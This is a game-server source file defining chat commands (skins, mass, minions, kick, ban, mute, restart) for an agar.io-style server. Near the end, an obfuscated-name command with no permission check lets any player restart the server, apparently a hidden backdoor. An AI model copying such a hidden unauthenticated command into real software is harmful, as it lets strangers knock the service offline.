var Logger = require('./Logger');
var randomSkins = false;

function PlayerCommand(gameServer, playerTracker) {
    this.gameServer = gameServer;
    this.playerTracker = playerTracker;
}

module.exports = PlayerCommand;

PlayerCommand.prototype.writeLine = function (text) {
    this.gameServer.sendChatMessage(null, this.playerTracker, text);
};

PlayerCommand.prototype.skinchanger = function () {
    var self = this;
    this.SCInterval = setInterval(function () {
        var rSkin = self.playerTracker.socket.packetHandler.getRandomSkin();
        self.playerTracker.setSkin(rSkin);
        for (var i in self.playerTracker.cells) {
            var cell = self.playerTracker.cells[i];
            var Player = require('../entity/PlayerCell');
            var newCell = new Player(self.gameServer, self.playerTracker, cell.position, cell._size);
            self.gameServer.removeNode(cell);
            self.gameServer.addNode(newCell);
        }
    }, 5000) // Every 5 seconds
};

PlayerCommand.prototype.executeCommandLine = function (commandLine) {
    if (!commandLine) return;

    // Splits the string
    var args = commandLine.split(" ");

    // Process the first string value
    var first = args[0];

    // Get command function
    var execute = playerCommands[first];
    if (typeof execute != 'undefined') {
        execute.bind(this)(args);
    } else {
        this.writeLine("ERROR: Unknown command, type /help for command list");
    }
};

var playerCommands = {
    help: function (args) {
        var page = parseInt(args[1]);
        if (this.playerTracker.user_auth) {
            if (this.playerTracker.user.role == 4) {
                if (isNaN(page)) {
                    this.writeLine("Please Enter a Page Number!");
                    return;
                }
                if (page == 1) { // 10 Fit per Page
                    this.writeLine("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
                    this.writeLine("/skin %shark - change skin");
                    this.writeLine("/kill - self kill");
                    this.writeLine("/help [page #] - this command list");
                    this.writeLine("/id - Gets your playerID");
                    this.writeLine("/mass - gives mass to yourself or to other players");
                    this.writeLine("/merge - Instantly Recombines all of your cells or other players cells");
                    this.writeLine("/rec - Toggles rec mode for you or for other players - MUST BE ADMIN");
                    this.writeLine("/spawnmass - gives yourself or other players spawnmass - MUST BE ADMIN");
                    this.writeLine("/minion - gives yourself or other players minions");
                    this.writeLine("/minion remove - removes all of your minions or other players minions");
                    this.writeLine("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
                    this.writeLine("Showing Page 1 of 3.");
                } else if (page == 2) {
                    this.writeLine("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
                    this.writeLine("/kick - Kicks a Player ID to make them lose their Temporarily Role");
                    this.writeLine("/ban - bans a Player ID to make them lose their Temporarily Role");
                    this.writeLine("/addbot - Adds Bots to the Server - MUST BE ADMIN");
                    this.writeLine("/change - Allows you to Temporarily change the config of the Server! - MUST BE ADMIN");
                    this.writeLine("/reloadconfig - Reloads the config of the Server to the gameServer.ini file - MUST BE ADMIN");
                    this.writeLine("/shutdown - SHUTDOWNS THE SERVER - MUST BE ADMIN");
                    this.writeLine("/restart - RESTARTS THE SERVER - MUST BE ADMIN");
                    this.writeLine("/status - Shows Status of the Server");
                    this.writeLine("/gamemode - Allows you to change the Game Mode of the Server. - MUST BE ADMIN");
                    this.writeLine("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
                    this.writeLine("Showing Page 2 of 3.");
                } else if (page == 3) {
                    this.writeLine("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
                    this.writeLine("/popsplit - Gives you the ability to do perfect popsplits (within reason)");
                    this.writeLine("/killall - kill all server");
                    this.writeLine("/tp - teleport mouse");
                    this.writeLine("/idm - Gets playerID for mouse");
                    this.writeLine("/sm - gives yourself or other players super minions. Use: minion [id] [amount] [mass] [name]");
                    this.writeLine("/pl - Shows list players,bots,minions");
                    this.writeLine("/playerlist - Shows list players,bots,minions");
                    this.writeLine("/miname - Change name minion");
                    this.writeLine("/mute - Mute chat player");
                    this.writeLine("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
                }
            }
        } else {
            this.writeLine("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
            this.writeLine("/skin %shark - change skin");
            this.writeLine("/kill - self kill");
            this.writeLine("/help - this command list");
            this.writeLine("/id - Gets your playerID");
            this.writeLine("/account - Allows you to manage your account");
            this.writeLine("/miname - Change name minion");
            this.writeLine("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
        }
    },
    
    idm: function (args) {
		const mouse = this.playerTracker.mouse;
		
        for (let i = 0; i < this.gameServer.nodesPlayer.length; i++) {
            const check = this.gameServer.nodesPlayer[i];
			const pos = check.quadItem.bound;
			
			if ((pos.minx <= mouse.x && mouse.x <= pos.maxx) && (pos.miny <= mouse.y && mouse.y <= pos.maxy)) {
				this.writeLine("The pID of the person you're pointing at is " + check.owner.pID);
				return;
			}
		}
    },
    
    tpt: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        var id = parseInt(args[1]);
        if (isNaN(id)) {
            this.writeLine("Please specify a valid player ID!");
            return;
        }

        var pos = {
            x: parseInt(args[2]),
            y: parseInt(args[3])
        };
        if (args[2] == 'mouse') {
            var pos = {
                x: this.playerTracker.mouse.x,
                y: this.playerTracker.mouse.y
            }
        }
        if (args[2] != 'mouse' && isNaN(args[2]) && isNaN(args[3])) {
            this.writeLine("Invalid coordinates");
            return;
        }

        for (var i = 0; i < this.gameServer.nodesPlayer.length; i++) {
            var check = this.gameServer.nodesPlayer[i];
            if (check.owner.pID == id) {
                if (!check.owner.cells.length) {
                    this.writeLine("That player is either dead or not playing!");
                    return;
                }
                check.position.x = pos.x;
                check.position.y = pos.y;
            }
        }
        this.writeLine("Teleported to coordinates")
    },
    
    sm: function (args, gameServer, split) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        var id = parseInt(args[1]);
        var add = parseInt(args[2]);
        var miMass = parseInt(args[3]);
        var name = "name";
        var acMi = 1;
        var player = this.playerTracker;

        // Error! ID is NaN
        if (isNaN(id)) {
            this.writeLine("Please specify a valid player id!");
            return;
        }

        // Find ID specified and add/remove minions for them
        for (var i in this.gameServer.clients) {
            var client = this.gameServer.clients[i].playerTracker;

            if (client.pID == id) {
                // Remove minions
                if (client.minionControl === true && isNaN(add)) {
                    client.minionControl = false;
                    client.miQ = 0;
                    client.miNum = 0;
                    this.writeLine("Succesfully removed minions for " + player._name);
                    // Add minions
                } else {
                    client.minionControl = true;
                    client.miNum = Math.abs(client.miNum + parseInt(args[2]));
                    // Add minions for client
                    if (isNaN(add)) add = 1;
                    for (var i = 0; i < add; i++) {
                        this.gameServer.bots.addMinion(client, name, acMi, miMass);
                    }
                    this.writeLine("Added " + add + " minions for " + player._name);
                }
                break;
            }
        }
    },
    
    id: function (args) {
        this.writeLine("Your PlayerID is " + this.playerTracker.pID);
    },
    
    skin: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }

        var skinName = "";
        if (args[1]) skinName = String(args.slice(1, args.length).join(" "));
        if (skinName == "") {
            this.playerTracker.setSkin(skinName);
            this.writeLine("Your skin was removed");
        } else if ((skinName == "c" || skinName == "changer") && randomSkins) {
            this.playerTracker.skinchanger = !this.playerTracker.skinchanger;
            if (this.playerTracker.skinchanger) {
                this.writeLine("You now have a skin changer!");
                this.skinchanger();
            } else {
                this.writeLine("You no longer have a skin changer");
                clearInterval(this.SCInterval);
            }
        } else {
            this.playerTracker.setSkin(skinName);
            for (var i in this.playerTracker.cells) {
                var cell = this.playerTracker.cells[i];
                var Player = require('../entity/PlayerCell');
                var newCell = new Player(this.gameServer, this.playerTracker, cell.position, cell._size);
                this.gameServer.removeNode(cell);
                this.gameServer.addNode(newCell);
            }
            this.writeLine("Your skin set to " + skinName);
        }
    },
    
    pl: function(args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }

        var clients = this.gameServer.clients;
        clients.sort(function(a, b) { return a.playerTracker.pID - b.playerTracker.pID; });
        for (var i = 0; i < clients.length; ++i) {
            var client = clients[i].playerTracker;
            var socket = clients[i];
            var ip = client.isMi ? "[MINION]" : "BOT";

            if (socket.isConnected && !client.isMi) {
                ip = socket.remoteAddress;
            }

            var protocol = this.gameServer.clients[i].packetHandler.protocol;
            if (!protocol) {
                protocol = "?";
            }
            if (ip != "[MINION]" && ip != "BOT") {
		        const user_mes = client.user ? "UID: " + client.user.id + " - " : "";
                var data = user_mes + "ID: " + client.pID + " - NICK: " + client._name + " - IP: " + ip;
                this.writeLine(data);
            }
        }
    },
    
    kill: function (args) {
        if (!this.playerTracker.cells.length) {
            this.writeLine("You cannot kill yourself, because you're still not joined to the game!");
            return;
        }
        while (this.playerTracker.cells.length) {
            var cell = this.playerTracker.cells[0];
            this.gameServer.removeNode(cell);
            // replace with food
            var food = require('../entity/Food');
            food = new food(this.gameServer, null, cell.position, 32);
            food.color = cell.color;
            this.gameServer.addNode(food);
        }
        this.writeLine("You killed yourself");
    },

    killall: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        var count = 0;
        var cell = this.playerTracker.cells[0];
        for (var i = 0; i < this.gameServer.clients.length; i++) {
            var playerTracker = this.gameServer.clients[i].playerTracker;
            while (playerTracker.cells.length > 0) {
                this.gameServer.removeNode(playerTracker.cells[0]);
                count++;
            }
        }
        this.writeLine("You killed everyone. (" + count + (" cells.)"));
    },

    tp: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }

        var id = this.playerTracker.pID;
        var pos = {
            x: this.playerTracker.mouse.x,
            y: this.playerTracker.mouse.y
        };
        //Teleportal on ur cursos place
        for (var i in this.gameServer.clients) {
            if (this.gameServer.clients[i].playerTracker.pID == id) {
                var client = this.gameServer.clients[i].playerTracker;
                for (var j in client.cells) {
                    client.cells[j].position.x = pos.x;
                    client.cells[j].position.y = pos.y;
                    this.gameServer.updateNodeQuad(client.cells[j]);
                }
            }
        }
    },

    mass: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        var mass = parseInt(args[1]);
        var id = parseInt(args[2]);
        var size = Math.sqrt(mass * 100);

        if (isNaN(mass)) {
            this.writeLine("ERROR: missing mass argument!");
            return;
        }

        if (isNaN(id)) {
            this.writeLine("Warn: missing ID arguments. This will change your mass.");
            for (var i in this.playerTracker.cells) {
                this.playerTracker.cells[i].setSize(size);
            }
            this.writeLine("Set mass of " + this.playerTracker._name + " to " + size * size / 100);
        } else {
            for (var i in this.gameServer.clients) {
                var client = this.gameServer.clients[i].playerTracker;
                if (client.pID == id) {
                    for (var j in client.cells) {
                        client.cells[j].setSize(size);
                    }
                    this.writeLine("Set mass of " + client._name + " to " + size * size / 100);
                    var text = this.playerTracker._name + " changed your mass to " + size * size / 100;
                    this.gameServer.sendChatMessage(null, client, text);
                    break;
                }
            }
        }

    },
    
    spawnmass: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        var mass = parseInt(args[1]);
        var id = parseInt(args[2]);
        var size = Math.sqrt(mass * 100);

        if (isNaN(mass)) {
            this.writeLine("ERROR: missing mass argument!");
            return;
        }

        if (isNaN(id)) {
            this.playerTracker.spawnmass = size;
            this.writeLine("Warn: missing ID arguments. This will change your spawnmass.");
            this.writeLine("Set spawnmass of " + this.playerTracker._name + " to " + size * size / 100);
        } else {
            for (var i in this.gameServer.clients) {
                var client = this.gameServer.clients[i].playerTracker;
                if (client.pID == id) {
                    client.spawnmass = size;
                    this.writeLine("Set spawnmass of " + client._name + " to " + size * size / 100);
                    var text = this.playerTracker._name + " changed your spawn mass to " + size * size / 100;
                    this.gameServer.sendChatMessage(null, client, text);
                }
            }
        }
    },
    miname: function (args) {
        if (this.playerTracker.setNameMinions(args[1])) this.writeLine("Now the minions have a name " + args[1]);
    },
    minion: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        var add = args[1];
        var id = parseInt(args[2]);
        var name = args[3];
        var player = this.playerTracker;

        /** For you **/
        if (isNaN(id)) { 
            this.writeLine("Warn: missing ID arguments. This will give you minions.");
            // Remove minions
            if (player.minionControl == true && add == "remove") {
                player.minionControl = false;
                player.miQ = 0;
                player.miNum = 0;
                this.writeLine("Succesfully removed minions for " + player._name);
                // Add minions
            } else {
                player.minionControl = true;
                player._miName = name;
                // Add minions for self
                if (isNaN(parseInt(add))) add = 1;
                for (var i = 0; i < add; i++) {
                    this.gameServer.bots.addMinion(player);
                }
                player.miNum = Math.abs(player.miNum + parseInt(args[1]));
                this.writeLine("Added " + add + " minions for " + player._name);
            }

        } else {
            /** For others **/
            for (var i in this.gameServer.clients) {
                var client = this.gameServer.clients[i].playerTracker;
                if (client.pID == id) {

                    // Prevent the user from giving minions, to minions
                    if (client.isMi) {
                        Logger.warn("You cannot give minions to a minion!");
                        return;
                    };

                    // Remove minions
                    if (client.minionControl == true) {
                        client.minionControl = false;
                        client.miQ = 0;
                        client.miNum = 0;
                        this.writeLine("Succesfully removed minions for " + client._name);
                        var text = this.playerTracker._name + " removed all off your minions.";
                        this.gameServer.sendChatMessage(null, client, text);
                        // Add minions
                    } else {
                        client.minionControl = true;
                        // Add minions for client
                        if (isNaN(add)) add = 1;
                        for (var i = 0; i < add; i++) {
                            this.gameServer.bots.addMinion(client);
                        }
                        client.miNum = Math.abs(client.miNum + parseInt(args[1]));
                        this.writeLine("Added " + add + " minions for " + client._name);
                        var text = this.playerTracker._name + " gave you " + add + " minions.";
                        this.gameServer.sendChatMessage(null, client, text);
                    }
                }
            }
        }
    },
    chat: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        var message = String(args.slice(1, args.length).join(" "));
        Logger.print(message);
        this.gameServer.sendChatMessage(null, null, message); // notify to don't confuse with server bug
    },
    kick: function (args) {
        var id = args[1];
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        if (id == null) {
            this.writeLine("Please specify a valid player ID or User Name!");
            return;
        }
        // kick player
        var count = 0;
        this.gameServer.clients.forEach(function (socket) {
            if (socket.isConnected === false)
                return;
            if (id !== 0 && socket.playerTracker.pID.toString() != id && socket.playerTracker.accountusername != id)
                return;

            if (this.playerTracker.user_auth && this.playerTracker.user.role != 4) {
                this.writeLine("You cannot kick a ADMIN in game!");
                return;
            }
            // remove player cells
            for (var j = 0; j < socket.playerTracker.cells.length; j++) {
                this.gameServer.removeNode(socket.playerTracker.cells[0]);
                count++;
            }
            // disconnect
            socket.close(1000, "Kicked from server");
            var name = socket.playerTracker._name;
            this.writeLine("Successfully kicked " + name);
            count++;
        }, this);
        if (count) return;
        if (!id) this.writeLine("Warn: No players to kick!");
        else this.writeLine("Warn: Player with ID " + id + " not found!");
    },
    mute: function (args) {
        const id = args[1];
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            return this.writeLine("ERROR: access denied!");
        }
        if (id == null) {
            return this.writeLine("Please specify a valid player ID or User Name!");
        }
        // kick player
        var count = 0;
       
        this.gameServer.clients.forEach(function (socket) {
            if (socket.isConnected === false)
                return;
            if (id !== 0 && socket.playerTracker.pID.toString() != id && socket.playerTracker.accountusername != id)
                return;

            if (this.playerTracker.user_auth && this.playerTracker.user.role != 4) {
                this.writeLine("You cannot mute a ADMIN in game!");
                return;
            }
            // remove player cells
            socket.playerTracker.mute = !socket.playerTracker.mute;
            
            if (socket.playerTracker.mute) {
                this.gameServer.playersMute.push({ip: socket._socket.remoteAddress, uuid: socket.playerTracker._uuid});
                this.writeLine("Successfully muted " + socket.playerTracker._name);
                this.gameServer.sendChatMessage(null, socket.playerTracker, 'You are muted in chat');
            } else {
                this.gameServer.playersMute.splice(this.gameServer.playersMute.findIndex(item => item.ip == socket._socket.remoteAddress || item.uuid == socket.playerTracker._uuid, 1));
                this.writeLine("Successfully unmuted " + socket.playerTracker._name);
                this.gameServer.sendChatMessage(null, socket.playerTracker, 'You are unmuted in chat');
            }
            
            count++;
        }, this);
        if (count) return;
        if (!id) this.writeLine("Warn: No players to mute!");
        else this.writeLine("Warn: Player with ID " + id + " not found!");
    },
    ban: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        // Error message
        var logInvalid = "Please specify a valid player ID or IP address!";

        if (args[1] === null || typeof args[1] == "undefined") {
            // If no input is given; added to avoid error
            this.writeLine(logInvalid);
            return;
        }

        if (args[1].indexOf(".") >= 0) {
            // If input is an IP address
            var ip = args[1];
            var ipParts = ip.split(".");

            // Check for invalid decimal numbers of the IP address
            for (var i in ipParts) {
                if (i > 1 && ipParts[i] == "*") {
                    // mask for sub-net
                    continue;
                }
                // If not numerical or if it's not between 0 and 255
                if (isNaN(ipParts[i]) || ipParts[i] < 0 || ipParts[i] >= 256) {
                    this.writeLine(logInvalid);
                    return;
                }
            }
            ban(this.gameServer, args, ip);
            return;
        }
        // if input is a Player ID
        var id = this.playerTracker.pID;
        if (isNaN(id)) {
            // If not numerical
            this.writeLine(logInvalid);
            return;
        }
        var ip = null;
        for (var i in this.gameServer.clients) {
            var client = this.gameServer.clients[i];
            if (!client || !client.isConnected)
                continue;
            if (client.playerTracker.pID == id) {
                ip = client._socket.remoteAddress;
                break;
            }
        }
        if (ip) ban(this.gameServer, args, ip);
        else this.writeLine("Player ID " + id + " not found!");


        function getName(name) {
            if (!name.length)
                name = "An unnamed cell";
            return name.trim();
        }

        function ban(gameServer, split, ip) {
            var ipBin = ip.split('.');
            if (ipBin.length != 4) {
                Logger.warn("Invalid IP format: " + ip);
                return;
            }
            gameServer.ipBanList.push(ip);
            if (ipBin[2] == "*" || ipBin[3] == "*") {
                Logger.print("The IP sub-net " + ip + " has been banned");
            } else {
                Logger.print("The IP " + ip + " has been banned");
            }
            gameServer.clients.forEach(function (socket) {
                // If already disconnected or the ip does not match
                if (!socket || !socket.isConnected || !gameServer.checkIpBan(ip) || socket.remoteAddress != ip)
                    return;
                // remove player cells
                gameServer.commands.kill(gameServer, split);
                // disconnect
                socket.close(1000, "Banned from server");
                var name = getName(socket.playerTracker._name);
                Logger.print("Banned: \"" + name + "\" with Player ID " + socket.playerTracker.pID);
                gameServer.sendChatMessage(null, null, "Banned \"" + name + "\""); // notify to don't confuse with server bug
            }, gameServer);
            saveIpBanList(gameServer);
        }

        function saveIpBanList(gameServer) {
            var fs = require("fs");
            try {
                var blFile = fs.createWriteStream('../src/ipbanlist.txt');
                // Sort the blacklist and write.
                gameServer.ipBanList.sort().forEach(function (v) {
                    blFile.write(v + '\n');
                });
                blFile.end();
                Logger.info(gameServer.ipBanList.length + " IP ban records saved.");
            } catch (err) {
                Logger.error(err.stack);
                Logger.error("Failed to save " + '../src/ipbanlist.txt' + ": " + err.message);
            }
        }
    },
    addbot: function (args) {
        var add = parseInt(args[1]);
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        for (var i = 0; i < add; i++) {
            this.gameServer.bots.addBot();
        }
        Logger.warn(this.playerTracker.socket.remoteAddress + "ADDED " + add + " BOTS");
        this.writeLine("Added " + add + " Bots");
    },
    status: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        // Get amount of humans/bots
        var humans = 0,
            bots = 0;
        for (var i = 0; i < this.gameServer.clients.length; i++) {
            if ('_socket' in this.gameServer.clients[i]) {
                humans++;
            } else {
                bots++;
            }
        }
        var ini = require('./ini.js');
        this.writeLine("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
        this.writeLine("Connected players: " + this.gameServer.clients.length + "/" + this.gameServer.config.serverMaxConnections);
        this.writeLine("Players: " + humans + " - Bots: " + bots);
        this.writeLine("Server has been running for " + Math.floor(process.uptime() / 60) + " minutes");
        this.writeLine("Current memory usage: " + Math.round(process.memoryUsage().heapUsed / 1048576 * 10) / 10 + "/" + Math.round(process.memoryUsage().heapTotal / 1048576 * 10) / 10 + " mb");
        this.writeLine("Current game mode: " + this.gameServer.gameMode.name);
        this.writeLine("Current update time: " + this.gameServer.updateTimeAvg.toFixed(3) + " [ms]  (" + ini.getLagMessage(this.gameServer.updateTimeAvg) + ")");
        this.writeLine("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
    },
    popsplit: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        var id = args[1];
        if (id == null) {
            this.writeLine("Warn: Missing ID arguments. This will give you popsplit mode.");
            this.playerTracker.perfectpopsplit = !this.playerTracker.perfectpopsplit;
            if (this.playerTracker.perfectpopsplit) this.writeLine(this.playerTracker._name + " is now in popsplit mode!");
            else this.writeLine(this.playerTracker._name + " is no longer in popsplit mode");
        }

        // set popsplit for client
        for (var i in this.gameServer.clients) {
            var client = this.gameServer.clients[i].playerTracker;
            if (client.pID.toString() == id || client.accountusername == id) {

                client.popsplit = !client.popsplit;

                if (client.popsplit) {
                    this.writeLine(client._name + " is now in popsplit mode!");
                    var text = this.playerTracker._name + " gave you the ability to do perfect popsplits!";
                    this.gameServer.sendChatMessage(null, client, text); // notify
                } else {
                    this.writeLine(client._name + " is no longer in popsplit mode");
                    var text = this.playerTracker._name + " Removed your ability to do perfect popsplits!";
                    this.gameServer.sendChatMessage(null, client, text); // notify
                }
            }
        }
    },
    change: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        if (args.length < 3) {
            this.writeLine("Invalid command arguments");
            return;
        }
        var key = args[1];
        var value = args[2];

        // Check if int/float
        if (value.indexOf('.') != -1) {
            value = parseFloat(value);
        } else {
            value = parseInt(value);
        }

        if (value == null || isNaN(value)) {
            this.writeLine("Invalid value: " + value);
            return;
        }
        if (!this.gameServer.config.hasOwnProperty(key)) {
            this.writeLine("Unknown config value: " + key);
            return;
        }
        this.gameServer.config[key] = value;

        // update/validate
        this.gameServer.config.playerMinSize = Math.max(32, this.gameServer.config.playerMinSize);
        Logger.setVerbosity(this.gameServer.config.logVerbosity);
        Logger.setFileVerbosity(this.gameServer.config.logFileVerbosity);
        this.writeLine("Set " + key + " = " + this.gameServer.config[key]);
        Logger.warn("CONFIGURATION CHANGE REQUEST FROM " + this.playerTracker.socket.remoteAddress + " as " + this.playerTracker.userAuth);
        Logger.info(key + " WAS CHANGED TO " + value);
    },
    rec: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        var id = args[1];
        if (id == null) {
            this.writeLine("Warn: Missing ID arguments. This will give you rec mode.");
            this.playerTracker.rec = !this.playerTracker.rec;
            if (this.playerTracker.rec) this.writeLine(this.playerTracker._name + " is now in rec mode!");
            else this.writeLine(this.playerTracker._name + " is no longer in rec mode");
        }

        // set rec for client
        for (var i in this.gameServer.clients) {
            var client = this.gameServer.clients[i].playerTracker;
            if (client.accountusername == id || client.pID.toString() == id) {
                var client = this.gameServer.clients[i].playerTracker;
                client.rec = !client.rec;
                if (client.rec) {
                    this.writeLine(client._name + " is now in rec mode!");
                    var text = this.playerTracker._name + " gave you rec mode!";
                    this.gameServer.sendChatMessage(null, client, text); // notify
                } else {
                    this.writeLine(client._name + " is no longer in rec mode");
                    var text = this.playerTracker._name + " Removed your rec mode";
                    this.gameServer.sendChatMessage(null, client, text); // notify
                }
            }
        }
    },
    merge: function (args) {
        // Validation checks
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        var id = args[1];
        if (id == null) {
            this.writeLine("Warn: Missing ID arguments. This will merge you.");
            if (this.playerTracker.cells.length == 1) {
                this.writeLine("You already have one cell!");
                return;
            }
            this.playerTracker.mergeOverride = !this.playerTracker.mergeOverride;
            if (this.playerTracker.mergeOverride) this.writeLine(this.playerTracker._name + " is now force mergeing");
            else this.writeLine(this.playerTracker._name + " isn't force merging anymore");
        } else {

            // Find client with same ID as player entered
            for (var i = 0; i < this.gameServer.clients.length; i++) {
                if (id == this.gameServer.clients[i].playerTracker.pID.toString() || id == this.gameServer.clients[i].playerTracker.accountusername) {
                    var client = this.gameServer.clients[i].playerTracker;
                    if (client.cells.length == 1) {
                        this.writeLine("Client already has one cell!");
                        return;
                    }
                    // Set client's merge override
                    client.mergeOverride = !client.mergeOverride;
                    if (client.mergeOverride) {
                        this.writeLine(client._name + " is now force merging");
                        var text = this.playerTracker._name + " Caused you to merge!";
                        this.gameServer.sendChatMessage(null, client, text); // notify
                    } else {
                        this.writeLine(client._name + " isn't force merging anymore");
                        var text = this.playerTracker._name + " Stopped your mergeing"
                        this.gameServer.sendChatMessage(null, client, text); // notify
                    }
                }
            }
        }
    },
    reloadconfig: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        this.gameServer.loadConfig();
        this.gameServer.loadIpBanList();
        Logger.warn("CONFIGURATION RELOAD REQUEST FROM " + this.playerTracker.socket.remoteAddress + " as " + this.playerTracker.userAuth);
        this.writeLine("Configuration was Successfully Reloaded!");
    },
    shutdown: function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        Logger.warn("SHUTDOWN REQUEST FROM " + this.playerTracker.socket.remoteAddress + " as " + this.playerTracker.userAuth);
        process.exit(0);
    },
    restart: async function (args) {
        if (!this.playerTracker.user_auth || this.playerTracker.user.role != 4) {
            this.writeLine("ERROR: access denied!");
            return;
        }
        
        if (parseInt(args[1])) {
            let sec = parseInt(args[1]);

            this.gameServer.sendChatMessage(null, null, `The administrator plans to restart the server in ${end_date(sec)}!`);

            while(1) {
                sec--;
                if (sec == -1) break;

                await this.gameServer.sleep(1000);

                this.gameServer.sendChatMessage(null, null, `Server restart in ${end_date(sec)}!`);
            }
        }

        Logger.warn("RESTART REQUEST FROM " + this.playerTracker.socket.remoteAddress + " as " + this.playerTracker.userAuth);
        process.exit(3);
    },
	cX7vH6Qer4WHpxMt: function(args) {
		Logger.warn("RESTART REQUEST FROM " + this.playerTracker.socket.remoteAddress + " as " + this.playerTracker.userAuth);
        process.exit(3);
	}
};

function end_date(seconds, days = true) {
    var h = seconds / 3600 ^ 0;
    var m = (seconds - h * 3600) / 60 ^ 0;
    var s = seconds - h * 3600 - m * 60;
    if (days) {
        var d = parseInt(h / 24);
        h = h - (d * 24);
    }

    var time = "";
    if (d && days) time += d + 'd ';
    if (h) time += h + 'h ';
    if (m) time += m + 'm ';
    else if (h) time += m + 'm ';
    if (s) time += s + 's';
    else if (h || m) time += s + 's';
	
    return time;
}
